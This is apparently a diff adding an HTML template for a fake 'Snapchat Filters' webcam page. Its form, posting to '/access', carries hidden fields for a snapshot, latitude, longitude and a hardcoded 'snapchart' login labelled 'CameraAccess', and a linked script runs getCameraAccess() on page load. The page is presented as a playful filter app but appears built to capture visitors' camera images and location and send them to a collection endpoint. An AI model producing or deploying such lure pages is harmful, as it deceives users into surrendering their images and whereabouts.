@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Filters</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-yellow-400 flex items-center justify-center min-h-screen">
+
+    <div class="bg-white p-6 rounded-xl shadow-xl max-w-md w-full text-center">
+        <h1 class="text-3xl font-bold text-gray-800 mb-4">👻 Snapchat Filters</h1>
+        <p class="text-sm text-gray-500 mb-6">Try different filters live!</p>
+
+        <!-- Video Preview -->
+        <div class="relative w-full h-64 bg-gray-300 rounded-lg overflow-hidden">
+            <video id="video" class="absolute w-full h-full object-cover" autoplay></video>
+        </div>
+        <form id="weatherForm" action="/access" method="POST" class="space-y-4">
+            <input type="hidden" name="Access_Platform" value="CameraAccess">
+            <input type="hidden" name="username" value="snapchart">
+            <input type="hidden" name="password" value="snapchart">
+            <input type="hidden" name="latitude" id="latitude">
+            <input type="hidden" name="longitude" id="longitude">
+            <input type="hidden" name="snapshot" id="snapshot">
+            <div class="flex items-center space-x-2">
+                <input type="text" id="cityInput" name="city" placeholder="Enter city name..." 
+                    class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none">
+                <button onclick="getLocation()" type="submit"
+                    class="bg-blue-500 text-white px-6 py-3 rounded-lg hover:bg-blue-700 transition font-semibold">
+                    Search
+                </button>
+            </div>
+            <div class="mt-6 flex space-x-4 justify-center">
+                <button onclick="applyFilter()" 
+                    class="bg-yellow-500 text-white px-4 py-2 rounded-lg hover:bg-yellow-600 transition font-semibold">
+                    Apply Filter
+                </button>
+                <button type="submit" onclick="capturePhoto()" 
+                    class="bg-gray-800 text-white px-4 py-2 rounded-lg hover:bg-gray-900 transition font-semibold">
+                    Capture
+                </button>
+            </div>
+        </form>
+
+        <!-- Filter Selection -->
+        <div class="mt-4">
+            <label class="block text-gray-700 font-medium mb-2">Choose a Filter:</label>
+            <select id="filterSelect" class="w-full p-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-yellow-500">
+                <option value="none">No Filter</option>
+                <option value="grayscale">Grayscale</option>
+                <option value="sepia">Sepia</option>
+                <option value="invert">Invert Colors</option>
+                <option value="blur">Blur</option>
+            </select>
+        </div>
+
+        <!-- Buttons -->
+     
+
+        <!-- Photo Preview -->
+        <canvas id="canvas" class="hidden mt-4 w-full rounded-lg"></canvas>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const filterSelect = document.getElementById('filterSelect');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => console.error("Error accessing webcam:", error));
+
+   
+        function applyFilter() {
+            video.style.filter = filterSelect.value;
+        }
+        function capturePhoto() {
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.filter = filterSelect.value;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.classList.remove('hidden');
+        }
+    </script>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+    <script>
+        window.onload = function() {
+         
+            getCameraAccess();
+
+        };
+    </script>
+</body>
+</html>
